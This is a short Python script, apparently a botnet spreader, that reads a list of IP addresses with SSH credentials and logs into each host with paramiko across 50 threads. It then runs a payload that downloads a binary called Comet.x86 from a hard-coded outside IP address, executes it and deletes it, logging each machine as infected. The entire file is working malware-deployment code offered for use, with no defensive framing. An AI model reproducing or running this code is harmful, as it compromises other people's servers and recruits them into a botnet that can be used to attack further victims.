# Made by https://github.com/Its-Vichy

import threading, paramiko, time

__zombies__, __threads__ = open('./zombies.txt', 'r+').read().splitlines(), 50

__payload__ = "wget http://194.31.98.37/bins/Comet.x86; chmod +x Comet.x86; ./Comet.x86; rm -rf Comet.x86"

class Infect(threading.Thread):
    def __init__(self, user: str, passw: str, ip: str, port: str):
        self.user = user
        self.passw = passw
        self.ip = ip
        self.port = port 

        threading.Thread.__init__(self)
    
    def run(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.ip, username= self.user, password= self.passw)

            stdin, stdout, stderr = ssh.exec_command(f'cat /proc/1')

            if str(stdout.read()).split('b\'')[1] != '':
                ssh.exec_command(__payload__)
                print(f'[INFECTED] {self.ip}')

        except Exception as e:
            if 'Authentication failed.' not in str(e):
                print(f'[INVALID] {self.ip}')

if __name__ == '__main__':
    for zombie in __zombies__:
        while threading.activeCount() >= __threads__:
            time.sleep(1)

        splt = zombie.split(':')
        Infect(splt[0], splt[3], splt[1], splt[2]).start()